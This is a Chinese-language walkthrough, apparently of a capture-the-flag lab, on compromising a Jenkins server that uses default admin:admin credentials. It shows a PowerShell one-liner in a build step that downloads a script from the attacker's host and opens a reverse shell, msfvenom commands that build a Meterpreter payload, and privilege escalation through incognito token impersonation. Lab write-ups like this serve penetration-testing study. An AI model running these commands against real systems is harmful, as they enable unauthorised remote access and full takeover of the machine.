登录页面是admin：admin

jenkins的默认账号密码，就是`admin/admin`

登录进去之后需要想办法

![image.png](https://s2.loli.net/2025/04/17/FicuwKpRBWzLe46.png)

## 初级权限
点击project

![image.png](https://s2.loli.net/2025/04/17/e1E9AtjWsBzivKH.png)

点击配置文件

在这里有远程命令执行的地方

```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.17.40.203:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.17.40.203 -Port 8888

因为是使用vpn的缘故 我们在这里ip也只能设置成vpn给我们分配的ip
```
![image.png](https://s2.loli.net/2025/04/18/Zs2wAiBd6pXhYMR.png)

配置完成后 直接点击build now 可以成功反弹shell 文件也成功上传

![image.png](https://s2.loli.net/2025/04/18/rKFAlivqWjOc439.png)

![image.png](https://s2.loli.net/2025/04/18/V4cX2Op6oK7iPne.png)

算获得了初始权限 我们下面用msf来演示一下 需要我们用msfvenom 编写一个能够生成Windows Meterpreter 反向shell的exe文件

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.17.40.203 LPORT=4567 -f exe -o shell2.exe
```

然后需要我们用刚才的powershell命令将这个shell2.exe传到靶机上

![image.png](https://s2.loli.net/2025/04/18/NfvE46SHbWDr5QZ.png)

在运行exe文件前 需要先设置好msf的参数

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST 10.17.40.203 
set LPORT 4567 
```

![image.png](https://s2.loli.net/2025/04/18/oUvTFcDQ3185KLs.png)

先运行msf 再运行exe文件 成功连接

## 权限提升
这里用令牌模拟来获取系统访问权限

### 基本知识

访问令牌包括：

    User SIDs(security identifier)
    用户 SID （安全标识符）
    Group SIDs  组 SID
    Privileges  特权

#### 类型
有两种类型的访问令牌：

1. 主访问令牌(primary access tokens)：此类令牌是指与登录时所生成的用户账户相关联的令牌。

2. 模拟令牌(impersonation tokens)：此类令牌能够允许特定进程（或进程中的线程）使用另一个（用户/客户端）进程的令牌来访问相关的资源。

对于模拟令牌，有不同的级别：

- SecurityAnonymous：当前 用户/客户端 不能模拟另一个 用户/客户端。
- SecurityIdentification：当前 用户/客户端 可以获得客户端的身份和权限，但不能模拟客户端。
- SecurityImpersonation：当前 用户/客户端 可以在本地系统上模拟客户端的安全上下文。
- SecurityDelegation：当前 用户/客户端 可以在远程系统上模拟客户端的安全上下文。

最常被滥用的特权：

- SeImpersonatePrivilege
- SeAssignPrimaryPrivilege
- SeTcbPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege

先使用whoami  /priv

查看本机在目标机子中的所有权限

目标机启用了两个关键权限（SeDebugPrivilege、SeImpersonatePrivilege），这两个权限能够让我们使用MSF中的模块来进行令牌模拟操作 这是个重点

![image.png](https://s2.loli.net/2025/04/18/yV8ne9N6dm42oK1.png)

![image.png](https://s2.loli.net/2025/04/18/UVvl1OnjQHGiKx6.png)

在Meterpreter shell界面加载MSF中的incognito模块

`incognito`是Metasploit Framework（MSF）中用于​**​令牌窃取与模拟​**​的核心后渗透模块，专为Windows系统设计。

```
load incognito
list_tokens -g
impersonate_token "BUILTIN\Administrators"
getuid

在这里有个BUILTIN\Administrators管理员账户可用 就模拟他的令牌

偷窃成功之后 会发现我们现在是管理员用户
```


![image.png](https://s2.loli.net/2025/04/18/6FDriBUySP5tuAo.png)



![image.png](https://s2.loli.net/2025/04/18/g9QDPw6WlCS4k3m.png)

获得了管理员用户 但还是不够因为我们没有实际对应用户的特殊权限 需要把进程转移到具有对应特权的进程中 、可以选择迁移到最安全的services.exe进程

![image.png](https://s2.loli.net/2025/04/18/T6kW1N8DwLZI2m7.png)


迁移成功
![image.png](https://s2.loli.net/2025/04/18/dxM9lNrknEjw7gt.png)

